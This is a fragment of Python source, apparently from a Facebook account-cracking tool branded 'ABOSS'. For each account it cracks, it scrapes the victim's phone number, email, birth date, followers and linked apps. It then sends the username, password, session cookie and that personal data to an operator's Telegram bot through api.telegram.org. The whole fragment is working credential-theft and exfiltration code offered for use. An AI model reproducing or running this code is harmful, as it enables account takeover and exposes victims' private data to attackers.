                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
                    
                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:
                        nomer = ''
                    
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:
                        email = ''
                    
                    try:
                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:
                        ttl = ''
                    
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:
                        teman = ''
                    
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:
                        pengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:
                        infoakun += f'''عٌبّوُسًـي جَآبّلَك حساب شغال من مدفوعه 🔥💀\n⋘─────━★ 𝐀𝐁𝐎𝐒𝐒 ★‏━─────⋙\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Nama Akun: {nama}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n\n⋘─────━★ 𝐀𝐁𝐎𝐒𝐒 ★ ‏━─────⋙\n❖ - COOKIE : {kuki}\n\n⋘─────━★ 𝐀𝐁𝐎𝐒𝐒 ★‏━─────⋙\n⊊𝗕𝗬⊋ ➩ @A_B_A_S64  @ABOS_PYT'''
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
                    (hit1, hit2) = (0, 0)
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
                                hit2 += 1
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
                                hit2 += 1
                    print('\n')
                    statusok = f'''\t\t\t\t\t\n   \n{infoakun}\t\t\t\t\t\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    cek_aboss_swat(kuki)

        except requests.exceptions.ConnectionError:
            time.sleep(31)

    loop += 1








def O():
    try:
        os.remove('ID.txt')
        os.remove('ok.coki.txt')
        os.remove('.token.txt')
        os.remove('.cok.txt')
    except Exception as error:
        exit(error)


def cek_aboss_swat(kuki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    
    try:
        for i in range(len(game)):
            tlh = f'''{game[i].replace('Ditambahkan pada', ' Ditambahkan pada')}'''
            requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlh))
            print('\r%s  \x1b[0m             → %s%s' % (P, H, game[i].replace('Ditambahkan pada', ' Ditambahkan pada')))
    except:
        print('\r    %s\x1b[0m cookie invalid' % M)
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = bs4.BeautifulSoup(w, 'html.parser')
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    
    try:
        for i in range(len(game)):
            tog = f'''{game[i].replace('Kedaluwarsa', ' Kedaluwarsa')}'''
            requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tog))
            print('\r%s  \x1b[0m            →  %s' % (P, game[i].replace('Kedaluwarsa', ' Kedaluwarsa')))
    except:
        print('\r    %s \x1b[0mcookie invalid' % M)



if __name__ == '__main__':
    
    try:os.system('git pull')
    except:pass
    
    try:os.mkdir('OK')
    except:pass
    
    try:os.mkdir('CP')
    except:pass
    
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass
    
    try:os.system('touch .prox.txt')
    except:pass
    
    try:os.system('pkg install play-audio')
    except:pass
    
    try:os.system('clear')
    except:pass
    ABOSS_CT()
